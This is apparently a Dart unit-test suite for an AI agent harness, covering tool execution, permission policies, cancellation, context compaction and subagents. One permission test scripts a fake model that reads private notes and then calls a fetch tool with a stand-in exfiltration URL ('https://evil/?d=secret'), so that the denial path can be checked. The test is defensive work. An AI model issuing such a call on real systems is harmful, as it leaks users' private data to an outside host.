import 'dart:async';

import 'package:agentic_harness/testing.dart';
import 'package:agentic_harness/agentic_harness.dart';
import 'package:test/test.dart';

/// Counts calls and echoes its input.
class EchoTool extends HarnessTool {
  EchoTool({
    this.readOnly = true,
    this.delay = Duration.zero,
    this.toolName = 'echo',
  });
  final bool readOnly;
  final Duration delay;
  final String toolName;
  int calls = 0;
  int concurrent = 0;
  int maxConcurrent = 0;

  @override
  String get name => toolName;
  @override
  String get description => 'Echo';
  @override
  Map<String, Object?> get inputSchema => const {
    'type': 'object',
    'properties': {
      'text': {'type': 'string'},
      'n': {'type': 'integer'},
    },
    'required': ['text'],
  };
  @override
  ToolAnnotations get annotations =>
      readOnly
          ? ToolAnnotations.readOnlyLocal
          : const ToolAnnotations(destructive: true);

  @override
  Future<ToolOutput> call(
    Map<String, Object?> input,
    ToolContext context,
  ) async {
    calls++;
    concurrent++;
    if (concurrent > maxConcurrent) maxConcurrent = concurrent;
    try {
      if (delay > Duration.zero) await Future<void>.delayed(delay);
      return ToolOutput.text(
        'echo:${input['text']}',
        structured: {'n': input['n']},
      );
    } finally {
      concurrent--;
    }
  }
}

AgentSpec spec(
  FakeModelClient model, {
  List<HarnessTool> tools = const [],
  PermissionPolicy permissions = PermissionPolicy.allowAll,
  ModelSettings settings = const ModelSettings(),
}) => AgentSpec(
  name: 'test',
  instructions: 'sys',
  model: model,
  tools: tools,
  permissions: permissions,
  settings: settings,
);

Future<(RunResult, List<RunEvent>)> runToEnd(
  AgentSpec agent, {
  String input = 'hi',
  RunConfig config = const RunConfig(),
  void Function(AgentRun run, RunEvent event)? onEvent,
}) async {
  final run = const Runner().run(
    agent,
    input: AgentMessage.user(input),
    config: config,
  );
  final events = <RunEvent>[];
  await for (final e in run.events) {
    events.add(e);
    onEvent?.call(run, e);
  }
  return (await run.result, events);
}

void main() {
  test('plain answer ends the run', () async {
    final model = FakeModelClient([FakeTurn.text('Hello there')]);
    final (result, events) = await runToEnd(spec(model));
    expect(result.stopReason, StopReason.endTurn);
    expect(result.finalText, 'Hello there');
    expect(result.turns, 1);
    expect(events.first, isA<RunStarted>());
    expect(events.last, isA<RunCompleted>());
    expect(
      events.whereType<TextDelta>().map((e) => e.text).join(),
      'Hello there',
    );
  });

  test('multi-step tool use feeds results back with matching ids', () async {
    final tool = EchoTool();
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('c1', 'echo', {'text': 'a'}),
      ]),
      FakeTurn.tools([
        const FakeToolCall('c2', 'echo', {'text': 'b'}),
      ]),
      FakeTurn.text('done'),
    ]);
    final (result, events) = await runToEnd(spec(model, tools: [tool]));
    expect(result.stopReason, StopReason.endTurn);
    expect(result.finalText, 'done');
    expect(tool.calls, 2);
    expect(model.requests, hasLength(3));
    final r1 = model.lastToolResults(1);
    expect(r1.single.toolUseId, 'c1');
    expect(r1.single.text, 'echo:a');
    expect(model.lastToolResults(2).single.toolUseId, 'c2');
    expect(events.whereType<ToolResultEvent>().first.structured, {'n': null});
    // Transcript: assistant(tool) user(result) assistant(tool) user(result) assistant(text)
    expect(result.newMessages.map((m) => m.role).toList(), [
      Role.assistant,
      Role.user,
      Role.assistant,
      Role.user,
      Role.assistant,
    ]);
  });

  test('two calls to the same tool both get results (no collapse)', () async {
    final tool = EchoTool();
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('c1', 'echo', {'text': 'x'}),
        const FakeToolCall('c2', 'echo', {'text': 'y'}),
      ]),
      FakeTurn.text('ok'),
    ]);
    await runToEnd(spec(model, tools: [tool]));
    final results = model.lastToolResults(1);
    expect(results.map((r) => r.toolUseId), ['c1', 'c2']);
    expect(results.map((r) => r.text), ['echo:x', 'echo:y']);
  });

  test(
    'read-only calls run in parallel, destructive calls sequentially',
    () async {
      final reader = EchoTool(delay: const Duration(milliseconds: 40));
      final writer = EchoTool(
        readOnly: false,
        toolName: 'write',
        delay: const Duration(milliseconds: 10),
      );
      final model = FakeModelClient([
        FakeTurn.tools([
          const FakeToolCall('a', 'echo', {'text': '1'}),
          const FakeToolCall('b', 'echo', {'text': '2'}),
          const FakeToolCall('c', 'echo', {'text': '3'}),
          const FakeToolCall('w1', 'write', {'text': '4'}),
          const FakeToolCall('w2', 'write', {'text': '5'}),
        ]),
        FakeTurn.text('ok'),
      ]);
      await runToEnd(spec(model, tools: [reader, writer]));
      expect(reader.maxConcurrent, 3);
      expect(writer.maxConcurrent, 1);
      expect(model.lastToolResults(1).map((r) => r.toolUseId), [
        'a',
        'b',
        'c',
        'w1',
        'w2',
      ]);
    },
  );

  test('unknown tool and invalid input are reported to the model', () async {
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('u', 'nope', {}),
        const FakeToolCall('v', 'echo', {'n': 1}),
        const FakeToolCall('j', 'echo', {}, rawArguments: '{"text": "cut'),
      ]),
      FakeTurn.text('ok'),
    ]);
    await runToEnd(spec(model, tools: [EchoTool()]));
    final results = model.lastToolResults(1);
    expect(results.every((r) => r.isError), isTrue);
    expect(results[0].text, contains('Unknown tool "nope"'));
    expect(results[0].text, contains('echo'));
    expect(results[1].text, contains(r'$.text is required'));
    expect(results[2].text, contains('could not be parsed'));
  });

  test('scalar arguments are coerced to the schema type', () async {
    final tool = EchoTool();
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('c', 'echo', {'text': 'a', 'n': '5'}),
      ]),
      FakeTurn.text('ok'),
    ]);
    final (_, events) = await runToEnd(spec(model, tools: [tool]));
    expect(events.whereType<ToolResultEvent>().single.structured, {'n': 5});
  });

  test('repeated identical calls are cut off', () async {
    final tool = EchoTool();
    const call = FakeToolCall('c', 'echo', {'text': 'same'});
    final model = FakeModelClient([
      for (var i = 0; i < 4; i++) FakeTurn.tools([call]),
      FakeTurn.text('ok'),
    ]);
    await runToEnd(spec(model, tools: [tool]));
    expect(tool.calls, 3);
    expect(model.lastToolResults(4).single.text, contains('already called'));
  });

  test('maxTurns stops the loop', () async {
    final model = FakeModelClient([
      for (var i = 0; i < 5; i++)
        FakeTurn.tools([
          FakeToolCall('c$i', 'echo', {'text': '$i'}),
        ]),
    ]);
    final (result, _) = await runToEnd(
      spec(model, tools: [EchoTool()]),
      config: const RunConfig(maxTurns: 2),
    );
    expect(result.stopReason, StopReason.maxTurns);
    expect(model.requests, hasLength(2));
    // The transcript is still well formed: last tool uses were answered.
    expect(result.newMessages.last.role, Role.user);
  });

  test(
    'model errors end the run with a typed error instead of hanging',
    () async {
      final model = FakeModelClient([
        const FakeTurn(error: RateLimitError('slow down')),
      ]);
      final (result, events) = await runToEnd(spec(model));
      expect(result.stopReason, StopReason.error);
      expect(result.error, isA<RateLimitError>());
      expect(
        events.whereType<RunError>().single.errorClass,
        ErrorClass.rateLimit,
      );
    },
  );

  test('tool exceptions become error results', () async {
    final failing = FunctionTool(
      name: 'boom',
      description: 'fails',
      inputSchema: const {'type': 'object'},
      annotations: ToolAnnotations.readOnlyLocal,
      run: (_, _) async => throw StateError('kaboom /secret/path'),
    );
    final model = FakeModelClient([
      FakeTurn.tools([const FakeToolCall('c', 'boom', {})]),
      FakeTurn.text('recovered'),
    ]);
    final (result, _) = await runToEnd(spec(model, tools: [failing]));
    expect(result.finalText, 'recovered');
    final text = model.lastToolResults(1).single.text;
    expect(text, contains('boom failed'));
    expect(text, isNot(contains('/secret/path')));
  });

  test('tool timeout reports an error and cancels the tool token', () async {
    var cancelled = false;
    final slow = FunctionTool(
      name: 'slow',
      description: 'slow',
      inputSchema: const {'type': 'object'},
      annotations: ToolAnnotations.readOnlyLocal,
      run: (_, ctx) async {
        ctx.cancel.onCancel(() => cancelled = true);
        await Future<void>.delayed(const Duration(seconds: 5));
        return ToolOutput.text('late');
      },
    );
    final model = FakeModelClient([
      FakeTurn.tools([const FakeToolCall('c', 'slow', {})]),
      FakeTurn.text('ok'),
    ]);
    await runToEnd(
      spec(model, tools: [slow]),
      config: const RunConfig(toolTimeout: Duration(milliseconds: 50)),
    );
    expect(model.lastToolResults(1).single.text, contains('timed out'));
    expect(cancelled, isTrue);
  });

  test('cancel during a model call stops promptly', () async {
    final model = FakeModelClient([
      const FakeTurn(text: 'x', delay: Duration(seconds: 10)),
    ]);
    final run = const Runner().run(spec(model), input: AgentMessage.user('hi'));
    final events = run.events.toList();
    await Future<void>.delayed(const Duration(milliseconds: 20));
    run.cancel();
    final result = await run.result.timeout(const Duration(seconds: 2));
    expect(result.stopReason, StopReason.cancelled);
    expect((await events).last, isA<RunCompleted>());
  });

  group('permissions', () {
    test('ask without canUseTool denies (fail closed)', () async {
      final writer = EchoTool(readOnly: false);
      final model = FakeModelClient([
        FakeTurn.tools([
          const FakeToolCall('c', 'echo', {'text': 'a'}),
        ]),
        FakeTurn.text('ok'),
      ]);
      await runToEnd(
        spec(model, tools: [writer], permissions: const PermissionPolicy()),
      );
      expect(writer.calls, 0);
      expect(model.lastToolResults(1).single.isError, isTrue);
    });

    test('canUseTool allow/deny and approval time is not tool time', () async {
      final writer = EchoTool(readOnly: false);
      final model = FakeModelClient([
        FakeTurn.tools([
          const FakeToolCall('c1', 'echo', {'text': 'yes'}),
          const FakeToolCall('c2', 'echo', {'text': 'no'}),
        ]),
        FakeTurn.text('ok'),
      ]);
      final policy = PermissionPolicy(
        canUseTool: (call) async {
          await Future<void>.delayed(const Duration(milliseconds: 80));
          return call.input['text'] == 'yes'
              ? const Allow()
              : const Deny('nope');
        },
      );
      final (_, events) = await runToEnd(
        spec(model, tools: [writer], permissions: policy),
        config: const RunConfig(toolTimeout: Duration(milliseconds: 50)),
      );
      expect(writer.calls, 1);
      final results = model.lastToolResults(1);
      expect(results[0].text, 'echo:yes');
      expect(results[1].text, 'nope');
      expect(events.whereType<ApprovalRequested>(), hasLength(2));
    });

    test('deny rules win over bypass; preToolUse can rewrite input', () async {
      final tool = EchoTool();
      final model = FakeModelClient([
        FakeTurn.tools([
          const FakeToolCall('c1', 'echo', {'text': 'secret'}),
          const FakeToolCall('c2', 'echo', {'text': 'plain'}),
        ]),
        FakeTurn.text('ok'),
      ]);
      final agent = AgentSpec(
        name: 't',
        instructions: '',
        model: model,
        tools: [tool],
        permissions: PermissionPolicy(
          mode: PermissionMode.bypass,
          rules: [
            PermissionRule(
              'ec*',
              PermissionBehavior.deny,
              when: (i) => i['text'] == 'secret',
              reason: 'blocked by rule',
            ),
          ],
        ),
        hooks: Hooks(
          preToolUse:
              (call) async => ContinueCall(
                updatedInput: {...call.input, 'text': '${call.input['text']}!'},
              ),
        ),
      );
      await runToEnd(agent);
      final results = model.lastToolResults(1);
      // Hook runs first (secret → secret!), so the rule no longer matches.
      expect(results[0].text, 'echo:secret!');
      expect(results[1].text, 'echo:plain!');
    });
  });

  test('ask_user round-trips through respond()', () async {
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('q', 'ask_user', {
          'question': 'Which?',
          'choices': ['A', 'B'],
        }),
      ]),
      FakeTurn.text('You chose B'),
    ]);
    final (result, events) = await runToEnd(
      spec(model, tools: [const AskUserTool()]),
      config: const RunConfig(toolTimeout: Duration(milliseconds: 30)),
      onEvent: (run, e) {
        if (e is UserInputRequested) {
          expect(e.choices, ['A', 'B']);
          Future<void>.delayed(const Duration(milliseconds: 80), () {
            expect(run.respond(e.requestId, 'B'), isTrue);
          });
        }
      },
    );
    expect(result.finalText, 'You chose B');
    expect(model.lastToolResults(1).single.text, 'B');
    expect(events.whereType<UserInputRequested>(), hasLength(1));
  });

  test('ask_user with fields asks one form question', () async {
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('q', 'ask_user', {
          'question': 'Trip details?',
          'fields': [
            {'id': 'who', 'label': 'Who is traveling?', 'required': true},
            {
              'id': 'budget',
              'label': 'Budget',
              'type': 'choice',
              'choices': ['Low', 'High'],
            },
            {'id': 'when', 'label': 'When', 'type': 'date'},
          ],
        }),
      ]),
      FakeTurn.text('Thanks'),
    ]);
    await runToEnd(
      spec(model, tools: [const AskUserTool()]),
      onEvent: (run, e) {
        if (e is UserInputRequested) {
          expect(e.inputType, 'form');
          final fields = e.fields!;
          expect(fields.map((f) => f.id), ['who', 'budget', 'when']);
          expect(fields[0].required, isTrue);
          expect(fields[1].choices, ['Low', 'High']);
          expect(fields[2].type, 'date');
          run.respond(e.requestId, '{"who":"Couple","budget":"High"}');
        }
      },
    );
    expect(
      model.lastToolResults(1).single.text,
      '{"who":"Couple","budget":"High"}',
    );
  });

  test('ask_user rejects fields without an id or with duplicate ids', () async {
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('q', 'ask_user', {
          'question': 'Details?',
          'fields': [
            {'id': 'a', 'label': 'A'},
            {'id': 'a', 'label': 'Again'},
          ],
        }),
      ]),
      FakeTurn.text('ok'),
    ]);
    final (_, events) = await runToEnd(
      spec(model, tools: [const AskUserTool()]),
    );
    final result = model.lastToolResults(1).single;
    expect(result.isError, isTrue);
    expect(result.text, contains('duplicate id'));
    expect(events.whereType<UserInputRequested>(), isEmpty);
  });

  test('todo_write state is returned on the result', () async {
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('t', 'todo_write', {
          'todos': [
            {'content': 'step 1', 'status': 'completed'},
            {'content': 'step 2', 'status': 'in_progress'},
          ],
        }),
      ]),
      FakeTurn.text('working'),
    ]);
    final (result, _) = await runToEnd(
      spec(model, tools: [const TodoWriteTool()]),
    );
    expect(result.todos.map((t) => t.status), [
      TodoStatus.completed,
      TodoStatus.inProgress,
    ]);
  });

  test('empty response with tools is retried once without tools', () async {
    final model = FakeModelClient([const FakeTurn(), FakeTurn.text('answer')]);
    final (result, _) = await runToEnd(spec(model, tools: [EchoTool()]));
    expect(result.finalText, 'answer');
    // Tools stay defined (transcripts may hold tool blocks) but calls are off.
    expect(model.requests[1].tools, isNotEmpty);
    expect(model.requests[1].toolChoice, ToolChoice.none);
  });

  test(
    'host-initiated tool calls run first, then the model continues',
    () async {
      final tool = EchoTool();
      final model = FakeModelClient([FakeTurn.text('Here is the result.')]);
      final run = const Runner().run(
        spec(model, tools: [tool]),
        input: AgentMessage.user('[pressed Search]'),
        initialToolCalls: const [
          ToolUseBlock(id: 'host_1', name: 'echo', input: {'text': 'q'}),
        ],
      );
      final events = await run.events.toList();
      final result = await run.result;
      expect(tool.calls, 1);
      expect(events.whereType<ToolResultEvent>().single.toolUseId, 'host_1');
      expect(
        model.requests.single.messages.last.toolResults.single.text,
        'echo:q',
      );
      expect(result.finalText, 'Here is the result.');
      expect(
        result.newMessages.first.providerMetadata['hostInitiated'],
        isTrue,
      );
    },
  );

  test('host-initiated calls still go through permissions', () async {
    final writer = EchoTool(readOnly: false);
    final model = FakeModelClient([FakeTurn.text('denied, sorry')]);
    final run = const Runner().run(
      spec(model, tools: [writer], permissions: const PermissionPolicy()),
      input: AgentMessage.user('[pressed Save]'),
      initialToolCalls: const [
        ToolUseBlock(id: 'host_1', name: 'echo', input: {'text': 'q'}),
      ],
    );
    await run.result;
    expect(writer.calls, 0);
    expect(
      model.requests.single.messages.last.toolResults.single.isError,
      isTrue,
    );
  });

  test('host-initiated writes ask even in bypass mode', () async {
    final writer = EchoTool(readOnly: false);
    var asked = 0;
    final model = FakeModelClient([FakeTurn.text('ok')]);
    final run = const Runner().run(
      spec(
        model,
        tools: [writer],
        permissions: PermissionPolicy(
          mode: PermissionMode.bypass,
          rules: const [PermissionRule('echo', PermissionBehavior.allow)],
          canUseTool: (_) async {
            asked++;
            return const Allow();
          },
        ),
      ),
      input: AgentMessage.user('[clicked]'),
      initialToolCalls: const [
        ToolUseBlock(id: 'host_1', name: 'echo', input: {'text': 'q'}),
      ],
    );
    await run.result;
    expect(asked, 1);
    expect(writer.calls, 1);
  });

  group('review regressions', () {
    test('open-world calls ask after private data was read', () async {
      final local = EchoTool(toolName: 'notes');
      final remote = FunctionTool(
        name: 'fetch',
        description: 'fetch',
        inputSchema: const {
          'type': 'object',
          'properties': {
            'url': {'type': 'string'},
          },
        },
        annotations: ToolAnnotations.readOnlyRemote,
        run: (_, _) async => ToolOutput.text('fetched'),
      );
      final model = FakeModelClient([
        FakeTurn.tools([
          const FakeToolCall('f1', 'fetch', {'url': 'a'}),
        ]),
        FakeTurn.tools([
          const FakeToolCall('n1', 'notes', {'text': 'secret'}),
        ]),
        FakeTurn.tools([
          const FakeToolCall('f2', 'fetch', {'url': 'https://evil/?d=secret'}),
        ]),
        FakeTurn.text('ok'),
      ]);
      await runToEnd(
        spec(
          model,
          tools: [local, remote],
          permissions: const PermissionPolicy(),
        ),
      );
      expect(
        model.lastToolResults(1).single.isError,
        isFalse,
      ); // before any read
      expect(
        model.lastToolResults(3).single.isError,
        isTrue,
      ); // after a read: asks → no UI → denied
    });

    test(
      'assumePrivateContext makes open-world calls ask from the start',
      () async {
        final remote = FunctionTool(
          name: 'fetch',
          description: 'fetch',
          inputSchema: const {'type': 'object'},
          annotations: ToolAnnotations.readOnlyRemote,
          run: (_, _) async => ToolOutput.text('fetched'),
        );
        final model = FakeModelClient([
          FakeTurn.tools([const FakeToolCall('f', 'fetch', {})]),
          FakeTurn.text('ok'),
        ]);
        await runToEnd(
          spec(model, tools: [remote], permissions: const PermissionPolicy()),
          config: const RunConfig(assumePrivateContext: true),
        );
        expect(model.lastToolResults(1).single.isError, isTrue);
      },
    );

    test('strict mode asks for open-world reads', () {
      final decision = const PermissionPolicy(
        mode: PermissionMode.strict,
      ).evaluate(
        const ToolCallRequest(
          toolUseId: 'x',
          toolName: 'web',
          input: {},
          annotations: ToolAnnotations.readOnlyRemote,
          displayLabel: 'web',
        ),
      );
      expect(decision.behavior, PermissionBehavior.ask);
    });

    test('dry-run blocks before asking and covers open-world tools', () async {
      var asked = 0;
      final remote = FunctionTool(
        name: 'fetch',
        description: 'fetch',
        inputSchema: const {'type': 'object'},
        annotations: ToolAnnotations.readOnlyRemote,
        run: (_, _) async => ToolOutput.text('fetched'),
      );
      final model = FakeModelClient([
        FakeTurn.tools([
          const FakeToolCall('w', 'echo', {'text': 'a'}),
          const FakeToolCall('f', 'fetch', {}),
        ]),
        FakeTurn.text('ok'),
      ]);
      await runToEnd(
        spec(
          model,
          tools: [EchoTool(readOnly: false), remote],
          permissions: PermissionPolicy(
            canUseTool: (_) async {
              asked++;
              return const Allow();
            },
          ),
        ),
        config: const RunConfig(dryRun: true),
      );
      expect(asked, 0);
      expect(
        model.lastToolResults(1).every((r) => r.text.contains('dry-run')),
        isTrue,
      );
    });

    test('a successful write resets the repeated-read counter', () async {
      final reader = EchoTool(toolName: 'read');
      final writer = EchoTool(readOnly: false, toolName: 'write');
      const read = FakeToolCall('r', 'read', {'text': 'list'});
      final model = FakeModelClient([
        FakeTurn.tools([read]),
        FakeTurn.tools([read]),
        FakeTurn.tools([read]),
        FakeTurn.tools([
          const FakeToolCall('w', 'write', {'text': 'x'}),
        ]),
        FakeTurn.tools([read]),
        FakeTurn.text('ok'),
      ]);
      await runToEnd(spec(model, tools: [reader, writer]));
      expect(reader.calls, 4);
    });

    test(
      'cancel while a read runs and an approval is open leaves no unhandled error',
      () async {
        final slowRead = EchoTool(delay: const Duration(milliseconds: 200));
        final writer = EchoTool(readOnly: false, toolName: 'write');
        final model = FakeModelClient([
          FakeTurn.tools([
            const FakeToolCall('a', 'echo', {'text': '1'}),
            const FakeToolCall('b', 'write', {'text': '2'}),
          ]),
        ]);
        final approvalOpen = Completer<void>();
        final run = const Runner().run(
          spec(
            model,
            tools: [slowRead, writer],
            permissions: PermissionPolicy(
              canUseTool: (_) {
                approvalOpen.complete();
                return Completer<PermissionDecision>().future; // never answered
              },
            ),
          ),
          input: AgentMessage.user('go'),
        );
        final events = run.events.toList();
        await approvalOpen.future;
        run.cancel();
        final result = await run.result.timeout(const Duration(seconds: 2));
        await events;
        expect(result.stopReason, StopReason.cancelled);
        // Transcript stays valid: the tool uses were answered.
        expect(result.newMessages.last.toolResults, hasLength(2));
      },
    );

    test('a pre-cancelled token ends the run immediately', () async {
      final token = CancelToken()..cancel();
      final model = FakeModelClient([FakeTurn.text('never')]);
      final run = const Runner().run(
        spec(model),
        input: AgentMessage.user('x'),
        cancel: token,
      );
      final result = await run.result;
      expect(result.stopReason, StopReason.cancelled);
      expect(model.requests, isEmpty);
    });
  });

  test('structured output is validated and repaired once', () async {
    final model = FakeModelClient([
      FakeTurn.text('not json'),
      FakeTurn.text('```json\n{"score": "7"}\n```'),
    ]);
    final (result, _) = await runToEnd(
      spec(
        model,
        settings: const ModelSettings(
          outputSchema: {
            'type': 'object',
            'properties': {
              'score': {'type': 'integer'},
            },
            'required': ['score'],
          },
        ),
      ),
    );
    expect(result.stopReason, StopReason.endTurn);
    expect(result.structuredOutput, {'score': 7});
    expect(model.lastMessageText(1), contains('JSON Schema'));
  });

  test('token budget stops the run', () async {
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('c', 'echo', {'text': 'a'}),
      ]),
      FakeTurn.text('never'),
    ]);
    final (result, _) = await runToEnd(
      spec(model, tools: [EchoTool()]),
      config: const RunConfig(maxTotalTokens: 10),
    );
    expect(result.stopReason, StopReason.budget);
  });

  test('context is compacted when over the window', () async {
    final big = 'x' * 4000;
    final model = FakeModelClient([
      FakeTurn.text('ok'),
    ], capabilities: const ModelCapabilities(contextWindow: 2000));
    final history = [
      for (var i = 0; i < 6; i++) ...[
        AgentMessage.user('q$i $big'),
        AgentMessage.assistant('a$i'),
      ],
    ];
    final run = const Runner().run(
      spec(model),
      history: history,
      input: AgentMessage.user('latest'),
      config: const RunConfig(context: ContextPolicy(keepRecentMessages: 2)),
    );
    final events = await run.events.toList();
    expect(events.whereType<ContextCompacted>(), hasLength(1));
    final sent = model.requests.single.messages;
    expect(sent.last.text, 'latest');
    expect(sent.first.role, Role.user);
    expect(sent.length, lessThan(history.length + 1));
  });

  test('a run window never exceeds the client hard limit', () async {
    final big = 'x' * 4000;
    final model = FakeModelClient([
      FakeTurn.text('ok'),
    ], capabilities: const ModelCapabilities(contextWindow: 2000));
    final run = const Runner().run(
      spec(model),
      history: [
        for (var i = 0; i < 6; i++) ...[
          AgentMessage.user('q$i $big'),
          AgentMessage.assistant('a$i'),
        ],
      ],
      input: AgentMessage.user('latest'),
      // A larger configured window is capped at the client's 2000.
      config: const RunConfig(
        contextWindow: 260000,
        context: ContextPolicy(keepRecentMessages: 2),
      ),
    );
    final events = await run.events.toList();
    expect(events.whereType<ContextCompacted>(), hasLength(1));
  });

  test('a large configured window avoids needless compaction', () async {
    final model = FakeModelClient([FakeTurn.text('ok')]);
    final run = const Runner().run(
      spec(model),
      history: [
        for (var i = 0; i < 6; i++) ...[
          AgentMessage.user('q$i ${'x' * 4000}'),
          AgentMessage.assistant('a$i'),
        ],
      ],
      input: AgentMessage.user('latest'),
      config: const RunConfig(
        contextWindow: 260000,
        context: ContextPolicy(fallbackContextWindow: 2000),
      ),
    );
    final events = await run.events.toList();
    expect(events.whereType<ContextCompacted>(), isEmpty);
  });

  test('subagent runs as a tool', () async {
    final child = FakeModelClient([FakeTurn.text('child answer')]);
    final parent = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('s', 'researcher', {'task': 'look it up'}),
      ]),
      FakeTurn.text('parent done'),
    ]);
    final sub = SubagentTool(
      agent: AgentSpec(
        name: 'researcher',
        instructions: 'research',
        model: child,
      ),
      name: 'researcher',
      description: 'Researches',
    );
    final (result, _) = await runToEnd(spec(parent, tools: [sub]));
    expect(result.finalText, 'parent done');
    expect(child.requests.single.messages.single.text, 'look it up');
    expect(parent.lastToolResults(1).single.text, 'child answer');
  });

  test('events serialize to JSON', () async {
    final model = FakeModelClient([
      FakeTurn.tools([
        const FakeToolCall('c', 'echo', {'text': 'a'}),
      ]),
      FakeTurn.text('ok'),
    ]);
    final (_, events) = await runToEnd(spec(model, tools: [EchoTool()]));
    for (final e in events) {
      expect(e.toJson()['type'], e.type);
    }
  });
}
